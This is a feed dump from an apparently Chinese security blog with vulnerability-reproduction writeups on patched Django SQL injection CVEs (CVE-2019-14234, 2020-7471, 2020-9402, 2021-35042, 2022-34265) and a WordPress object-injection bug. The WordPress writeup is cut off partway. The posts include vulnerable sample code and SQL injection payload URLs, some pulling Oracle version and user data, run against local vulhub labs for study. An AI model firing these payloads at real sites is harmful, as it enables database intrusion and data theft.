class="headerlink" title="0x04 CVE-2022-34265"></a>0x04 CVE-2022-34265</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2022年发布的安全更新，修复了在 <code>Trunc()</code> 和 <code>Extract()</code> 函数中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.2.x &lt; 3.2.14</li><li>Django 4.0.x &lt; 4.0.6</li></ul><p>需要使用了 <code>Trunc()</code> 或 <code>Extract()</code>  方法，并且参数可控</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以直接来到 <code>github</code> 修复记录</p><p><img src="20220923163054.png" alt="1"></p><p>在这里是直接给 <code>Extract</code> 类或者 <code>Trunc</code> 类的 <code>as_sql</code> 方法添加了一层正则过滤。</p><p>这里我们以 <code>Extract</code> 为例，可以多关注被过滤的那个参数，也就是 <code>self.lookup_name</code> </p><p><img src="20220923164046.png" alt="1"></p><p>这里我们可以进入多个分支，但之后得处理实际上都差不多，我们先进入 <code>datetime_extract_sql</code> </p><p><img src="20220923164231.png" alt="1"></p><p>这里还是进入了和上面一样的 <code>date_extract_sql</code> 函数，而且没有经历其他的处理</p><p><img src="20220923164335.png" alt="1"></p><p>看到 <code>lookup_type</code> ，就是我们之前传入的被过滤的参数，最后在 <code>else</code> 直接拼接了，直接造成 <code>sql</code> 注入。 </p><p><code>trunc</code> 也是一样，不过进入的是 <code>datetime_trunc_sql</code>  或者 <code>time_trunc_sql</code> 等函数</p><p><img src="20220923164652.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞复现可以参照修复记录中的 <code>test</code> ，这里直接使用 <code>vulhub</code> 的环境，可以直接在下面获取</p><p><code>payload</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8000</span>/?date=aaa%<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure><p><img src="20220923202021.png" alt="1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1962&quot;&gt;https://forum.butian.net/share/1962&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="Python漏洞复现" scheme="https://n0puple.github.io/categories/Python%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="SQL注入漏洞" scheme="https://n0puple.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Python" scheme="https://n0puple.github.io/tags/Python/"/>
    
    <category term="Django" scheme="https://n0puple.github.io/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>DedeCMS_5.7.97_前台RCE_漏洞挖掘与分析（密码保护）</title>
    <link href="https://n0puple.github.io/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>https://n0puple.github.io/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/</id>
    <published>2022-10-04T14:37:46.000Z</published>
    <updated>2022-11-05T12:01:22.305Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="hash错误">  <script id="hbeData" type="hbeData" data-hmacdigest="e541b97ba840e3363fc767cb3c8dc2e34b9efeaee4246be41dbb7d21188d885b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">文章已加密, 请输入密码</summary>
    
    
    
    <category term="漏洞挖掘" scheme="https://n0puple.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="PHP" scheme="https://n0puple.github.io/tags/PHP/"/>
    
    <category term="未授权漏洞" scheme="https://n0puple.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://n0puple.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="DedeCMS" scheme="https://n0puple.github.io/tags/DedeCMS/"/>
    
    <category term="CNVD" scheme="https://n0puple.github.io/tags/CNVD/"/>
    
  </entry>
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（上）</title>
    <link href="https://n0puple.github.io/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://n0puple.github.io/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2022-09-23T14:24:53.000Z</published>
    <updated>2022-11-04T14:29:58.024Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1923">https://forum.butian.net/share/1923</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。</p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享四个 <code>CVE</code> ，剩余三个 <code>CVE</code> 将在下篇文章展现。</p><ul><li>CVE-2019-14234</li><li>CVE-2020-7471</li><li>CVE-2020-9402</li><li>CVE-2021-35042</li></ul><h2 id="0x02-CVE-2019-14234"><a href="#0x02-CVE-2019-14234" class="headerlink" title="0x02 CVE-2019-14234"></a>0x02 CVE-2019-14234</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2019年发布的一个安全更新，修复了在 <code>JSONField</code>、<code>HStoreField</code> 两个模型字段中存在的SQL注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.4</li><li>Django 2.1.x &lt; 2.1.11</li><li>Django 1.11.x &lt; 1.11.23</li></ul><p>该漏洞需要开发者使用了 <code>JSONField</code> 或者 <code>HStoreField</code> ，并且 <code>QuerySet</code> 中的键名可控，<code>Django</code> 自带的 <code>Django-admin</code> 中就存在这样的写法，可以利用其进行攻击。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>当我们进行查询时，会使用到 <code>QuerySet</code> ，一般形式为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.filter</span>(blog__author__extra=<span class="hljs-string">&#x27;tom&#x27;</span>)<span class="hljs-selector-class">.all</span>()<br></code></pre></td></tr></table></figure><p><code>filter</code> 中包含三个部分，由 <code>__</code> 分割，第一部分被称为 <code>transform</code> ，比如此处，就是查找 <code>blog</code> 表中的 <code>author</code> 字段，一般这里就是通过外键表现两个表之间的关系，但也存在特殊情况，比如存在 <code>JSONField</code> 类型的字段时，那么就是从 <code>JSON</code> 字段中查找；第二部分是字段，表的字段或者 <code>JSON</code> 的字段；第三部分被称为 <code>lookup</code> ，表示为后面值之间的对比关系，可不写，默认为 <code>extra</code>。</p><p>此处我们选择 <code>JSONField</code> 进行分析，当 <code>blog</code> 字段为 <code>JSONField</code> 类型时，</p><p><img src="20220921171923.png" alt="1"></p><p><code>JSONField</code> 继承自 <code>Field</code> ，<code>Field</code> 又是继承 <code>RegisterLookupMixin</code> ，已经存在一个 <code>get_transform</code> 方法，此处由于获取方式不同，因此重写该方法，之后是返回了一个 <code>KeyTransformFactory(name)</code> ，接下来看看这里的代码</p><p><img src="image-20220921173225909.png" alt="1"></p><p>直接被调用时，又会触发 <code>KeyTransform(self.key_name, *args, **kwargs)</code></p><p><img src="20220921173335.png" alt="1"></p><p>在这里，最后会被执行 <code>as_sql</code> 方法，目的是生成 <code>sql</code> 语句，但是这里的 <code>self.key_name</code> 没有经过任何过滤就被拼接并直接返回，因此造成了注入。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>如下所示，<code>Collections</code> 就是在 <code>model</code> 中使用了 <code>JSONField</code> </p><p><img src="20220921153333.png" alt="1"></p><p>代码和细节如下</p><p><img src="20220921153819.png" alt="1"></p><p>此处的 <code>detail</code> 使用了 <code>JSONField</code> ，访问链接即可触发漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8000</span><span class="hljs-regexp">/admin/</span>vuln<span class="hljs-regexp">/collection/</span>?detail__a%<span class="hljs-number">27</span>b=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="20220921154135.png" alt="1"></p><h2 id="0x03-CVE-2020-7471"><a href="#0x03-CVE-2020-7471" class="headerlink" title="0x03 CVE-2020-7471"></a>0x03 CVE-2020-7471</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的一个安全更新，修复了在 <code>StringAgg</code> 中存在的SQL注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.10</li><li>Django 3.0.x &lt; 3.0.3</li><li>Django 1.11.x &lt; 1.11.28</li></ul><p>该漏洞需要开发者使用了 <code>StringAgg</code>  ，并且 <code>delimiter</code> 参数可控，则可以利用其进行攻击。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看到 <code>github</code> 上的代码比对</p><p><img src="20220921230809.png" alt="1"></p><p>这里说明两点问题，第一， <code>delimter</code> 参数没有经过过滤就传入，第二，<code>delimter</code> 会直接进行字符串拼接，因此也是导致了存在 <code>SQL</code> 注入漏洞的原因。</p><p>接下来我们要做的就是找到使用该漏洞类的地方，关于 <code>StringAgg</code> 的使用可以看官方文档 <code>https://docs.djangoproject.com/zh-hans/4.1/ref/contrib/postgres/aggregates/</code> </p><p>很容易就可以得到一个可以利用的场景</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.annotate</span>(tempname=<span class="hljs-built_in">StringAgg</span>(<span class="hljs-string">&#x27;name&#x27;</span>, delimiter=query))<span class="hljs-selector-class">.values</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>vulhub</code> 中没有找到相应的环境，找一个类似的环境改改，注意也需要使用 <code>postgres</code> 数据库</p><p><code>views.py</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> django.shortcuts import render, HttpResponse<br><span class="hljs-keyword">from</span> .models import Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general import StringAgg<br><br><span class="hljs-comment"># Create your views here.</span><br><br>def vuln(request):<br>    query = request.GET.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-attribute">default</span>=0.05)<br>    qs = Collection.objects.annotate(<span class="hljs-attribute">tempname</span>=StringAgg(&#x27;name&#x27;, <span class="hljs-attribute">delimiter</span>=query))<br>    <span class="hljs-built_in">print</span>(qs.query)<br>    return HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>models.py</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">from</span> django.db <span class="hljs-keyword">import</span> models<br><span class="hljs-title">from</span> django.contrib.postgres.fields <span class="hljs-keyword">import</span> JSONField<br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Collection</span>(<span class="hljs-title">models</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    name = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class">    detail = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class"></span><br><span class="hljs-class">    def __str__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        return self.name</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><code>urls.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> <span class="hljs-keyword">admin</span><br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> <span class="hljs-type">path</span><br><span class="hljs-keyword">from</span> vuln <span class="hljs-keyword">import</span> views<br><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, <span class="hljs-keyword">admin</span>.site.urls),<br>    path(<span class="hljs-string">&#x27;vuln/&#x27;</span>, views.vuln),<br>]<br><br></code></pre></td></tr></table></figure><p>最后可以得到如下 <code>poc</code></p><p><img src="20220921231943.png" alt="1"></p><h2 id="0x04-CVE-2020-9402"><a href="#0x04-CVE-2020-9402" class="headerlink" title="0x04 CVE-2020-9402"></a>0x04 CVE-2020-9402</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的安全更新，修复了在 <code>GIS</code> 查询功能中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.11</li><li>Django 1.11.x &lt; 1.11.29</li><li>Django 3.0.x &lt; 3.0.4</li></ul><p>需要使用了 <code>GIS</code> 聚合查询，用户使用 <code>oracle</code> 的数据库且存在可控 <code>tolerance</code> </p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看 <code>github</code> 的分析  <code>https://github.com/django/django/commit/fe886a3b58a93cfbe8864b485f93cb6d426cd1f2</code></p><p><img src="20220921205621.png" alt="1"></p><p>这里修补了两处漏洞，都是同一个参数 <code>tolerance</code> 引起的，看到这里会觉得还比较简单，直接从 <code>self.extra</code> 中获取到参数，直接进行拼接，得到最后的 <code>sql</code> 代码，<code>as_oracle</code> 方法，就是得到的 <code>oracle</code> 的 <code>sql</code> 代码，也就是这个漏洞应该只存在于使用 <code>oracle</code> 数据库时</p><p>虽然知道这里存在漏洞，我们更重要的是去获取什么时候会触发这两个漏洞，所以要去看代码，可以直接搜索 <code>tolerance</code></p><h4 id="第一处漏洞"><a href="#第一处漏洞" class="headerlink" title="第一处漏洞"></a>第一处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\aggregates.py</code></p><p><img src="20220921210237.png" alt="1"></p><p>此类继承于 <code>django.db.models.aggregates.Aggregate</code> ，然后下面这个 <code>Union</code> 类又继承 <code>GeoAggregate</code> </p><p><img src="20220921210544.png" alt="1"></p><p>因此可以通过使用 <code>GIS</code> 中的 <code>Union</code> 类来触发第一个漏洞</p><h4 id="第二处漏洞"><a href="#第二处漏洞" class="headerlink" title="第二处漏洞"></a>第二处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\functions.py</code></p><p><img src="20220921211016.png" alt="1"></p><p>这里逻辑也是一样，没有任何过滤，接下来就是去找可以直接调用这里的位置，也就是找继承的位置，可以找到下面这个 <code>Distance</code></p><p><img src="20220921211202.png" alt="1"></p><p>至于接下来该如何去直接使用这两个类，可以查看官方文档，这里我直接看的 <code>vulhub</code> 中的</p><p><img src="20220921211336.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>第一处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln/q=?<span class="hljs-number">20</span>) = <span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> v$instance)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">OR</span> (<span class="hljs-number">1</span><span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212748553.png" alt="1"></p><p>第二处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln2/q=?<span class="hljs-number">0.05</span>))) <span class="hljs-keyword">FROM</span> &quot;VULN_COLLECTION2&quot; <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> DUAL)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212404303.png" alt="1"></p><h2 id="0x05-CVE-2021-35042"><a href="#0x05-CVE-2021-35042" class="headerlink" title="0x05 CVE-2021-35042"></a>0x05 CVE-2021-35042</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2021年发布的安全更新，修复了在 <code>order_by </code> 中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-3"><a href="#漏洞影响-3" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.1.x &lt; 3.1.13</li><li>Django 3.2.x &lt; 3.2.5</li></ul><p>需要使用了 <code>order_by </code> </p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>出现问题的点是在 <code>order_by</code> ，先搜索这个方法</p><p><img src="20220922105526.png" alt="1"></p><p>首先 <code>clean_ordering</code> ，也就是将 <code>ordering</code> 置空</p><p><img src="image-20220922105747504.png" alt="1"></p><p>然后进行 <code>add_ordering</code></p><p><img src="20220922105840.png" alt="1"></p><p>想要将传进来的字段添加到 <code>order_by</code> ，需要经过一些验证</p><p>将每一部分取出来进行比较，是字符串时进行比较，包含点号时，直接 <code>continue</code> ，跳过了后面的 <code>names_to_path</code> 验证，因此可以通过添加点号的形式绕过。</p><p>处理带点号的代码位于文件 <code>django/db/models/sql/compiler.py </code>的 <code>get_order_by </code>函数中，核心代码如下</p><p><img src="20220922162157.png" alt="1"></p><p>在这里对 <code>table</code> 进行了过滤，但是并没有对 <code>col</code> 进行过滤，因此造成了注入。</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>简单来个报错的 <code>payload</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?order=aaa.ta<span class="hljs-string">b&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="20220922163320.png" alt="1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1923&quot;&gt;https://forum.butian.net/share/1923&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="Python漏洞复现" scheme="https://n0puple.github.io/categories/Python%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE" scheme="https://n0puple.github.io/tags/CVE/"/>
    
    <category term="漏洞复现" scheme="https://n0puple.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="SQL注入漏洞" scheme="https://n0puple.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Python" scheme="https://n0puple.github.io/tags/Python/"/>
    
    <category term="Django" scheme="https://n0puple.github.io/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>WordPress_5.8.2_对象注入漏洞_CVE-2022-21663</title>
    <link href="https://n0puple.github.io/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/"/>
    <id>https://n0puple.github.io/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/</id>
    <published>2022-02-16T02:28:26.000Z</published>
    <updated>2022-11-04T14:19:23.643Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1303">https://forum.butian.net/share/1303</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>看了 <code>wordpress</code>注入（ <code>CVE-2022-21661</code> ）的洞之后，发现还存在另外一个对象注入漏洞，具有管理员权限的用户通过更改一些选项，将有机会 <code>getshell</code>。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>getshell</code>的条件：</p><ul><li><p><code>wordpress &lt; 5.8.3</code></p></li><li><p>启用多站点模式</p></li><li><p>存在一条可用的反序列化链（在本文中不会讲这个）</p></li></ul><p>这是 <code>github</code>上的漏洞修复记录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WordPress/</span>WordPress<span class="hljs-regexp">/commit/</span><span class="hljs-number">66</span>bb979049fa1a515d031e53ab100d507ed7bc8b<br></code></pre></td></tr></table></figure><p><img src="1645017413692-340e0a04-00f9-4ac1-be41-896ad2f07c85.png" alt="1"></p><p>因此这里的环境选择前一条提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">7</span>d20ea9<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>这里是以我复现这个漏洞时候的角度来分析的，因此会有一些弯路</p><h3 id="漏洞入口点"><a href="#漏洞入口点" class="headerlink" title="漏洞入口点"></a>漏洞入口点</h3><p>首先来到 <code>wp-admin/upgrade.php</code>，这是管理员可以直接访问到的文件，也是我认为的此漏洞的入口点。</p><p><img src="1645016015891-21b5b1a1-46d9-404a-8801-e6c89a6f7fbc.png" alt="1"></p><p>跟进 <code>wp_upgrade</code>函数，来到 <code>wp-admin/includes/upgrade.php</code></p><p><img src="1645016103918-353490ff-585c-4a2a-960a-330be6f1acad.png" alt="1"></p><p>首先看几个全局变量，<code>$wp_db_version</code>在 <code>wp-includes/version.php</code>中定义，根据其定义处的注释来看，这是本安装程序的数据库版本，在下一行中从数据库中取出了 <code>db_version</code>赋值给 <code>$wp_current_db_version</code>，看这情况，大概是一个是固定的数据库版本，另一个是可变的，<code>upgrade.php</code>会时不时地比较，当发生改变时，会进行一些操作</p><p>接下来看到我下的断点处，进入 <code>upgrade_all()</code>函数</p><p><img src="1645016595248-a63a464a-0cbc-4203-bfe2-b192e18d0227.png" alt="1"></p><p>这里就是在将两个版本进行比较，一致时不发生任何变化，不一致时运行后面的代码，接着看下面</p><p><img src="1645016658540-437ff7af-3fdb-414f-ba4a-db536ec3197f.png" alt="1"></p><p>根据从数据库中取出的 <code>db_version</code>也就是此处的 <code>$wp_current_db_version</code>的大小，会进行不同的处理，我们来关注断点处的 <code>upgrade_280</code>函数</p><p><img src="1645016845600-d2145051-be96-4802-9733-ba339c957596.png" alt="1"></p><p>看到 1611 行的 <code>is_multisite()</code>，跟进</p><p><img src="1645016943319-8531ffcb-c3ff-4525-bce6-849147549291.png" alt="1"></p><p>这是一个判断是否开启了多站点的函数，这也是本漏洞的一个开启条件，必须要开启多站点才可以。开多站点需要改配置文件，我这里图省事儿，直接改了判断条件 <code>!is_multisite()</code>，强行让他绕过了 </p><p>继续看上面，进入循环，每次从 <code>wp_options</code>表中取 20 条数据，将每一条数据都进行反序列化，漏洞的点就在此处了，因为 <code>wp_options</code>中的数据大部分都是可控的，我们可以通过管理员修改其值，最后进入反序列化。</p><p>还有两个问题，第一，如何控制 <code>db_version</code>的值，让他进入我们想要进入的函数；第二，如何更改 <code>wp_options</code>中的值。</p><h3 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h3><p>其实这两个是同一个问题，一并解决，<code>wordpress</code>后台没有直接访问所有 <code>options</code>的按钮，但我们可以访问 <code>wp-admin/options.php</code></p><p><img src="1645017818708-9ea5b601-fcba-4f81-ad90-1c66eb516163.png" alt="1"></p><p>这里可以更改 <code>db_options</code>中大部分的值，包括 <code>db_version</code>，我们将其修改为 10300，就满足了进入漏洞函数的要求，接下来我们尝试写入反序列化字符串</p><p>我们先随便选择一个选项写入反序列化字符串，这里我首先选择的是 <code>blogdescription</code>，也就是博客描述，这个也可以在常规选项中更改（更建议，因为需要处理的值会更少，调试没那么费力）,<code>post</code>的数据会逐个进入 <code>wp-includes/option.php</code>中的 <code>update_option</code>，来看几个比较重要的函数（PS：太长截图截不完）</p><p><img src="1645018862918-8acd7c3e-15ce-4cda-a723-210ef2901ffe.png" alt="1"></p><p>这里首先说明一下 